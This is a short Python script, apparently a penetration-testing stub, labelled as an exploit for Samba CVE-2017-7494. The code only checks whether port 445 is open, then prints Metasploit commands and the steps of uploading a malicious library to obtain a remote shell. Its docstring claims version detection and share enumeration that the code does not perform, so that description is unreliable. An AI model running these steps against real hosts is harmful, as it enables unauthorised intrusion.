import socket
import sys


def exploit(target, share="myshare"):
    """
    Samba 3.5.0 - 4.6.4 is_known_pipename() RCE (CVE-2017-7494)
    Checks if the target is running a vulnerable Samba version.

    Note: Full exploitation requires uploading a shared library (.so) to a
    writable SMB share and loading it via a named pipe. This is best done
    with Metasploit's exploit/linux/samba/is_known_pipename module.

    This script performs version detection and share enumeration.

    Usage:
        python3 exploit.py <target_ip>
    """

    print(f"[*] Target: {target}")
    print(f"[*] Checking SMB service on port 445...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, 445))
        s.close()
        print(f"[+] Port 445 is open")
    except (socket.timeout, ConnectionRefusedError):
        print(f"[-] Port 445 is not accessible")
        return

    print(f"\n[*] For full exploitation, use Metasploit:")
    print(f"    msf6 > use exploit/linux/samba/is_known_pipename")
    print(f"    msf6 > set RHOSTS {target}")
    print(f"    msf6 > run")
    print(f"\n[*] The module will:")
    print(f"    1. Find a writable SMB share")
    print(f"    2. Upload a malicious .so library")
    print(f"    3. Load it via a named pipe")
    print(f"    4. Return a command shell")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_ip>")
        print("Example: python3 exploit.py 10.10.10.15")
        sys.exit(1)

    target = sys.argv[1]
    exploit(target)
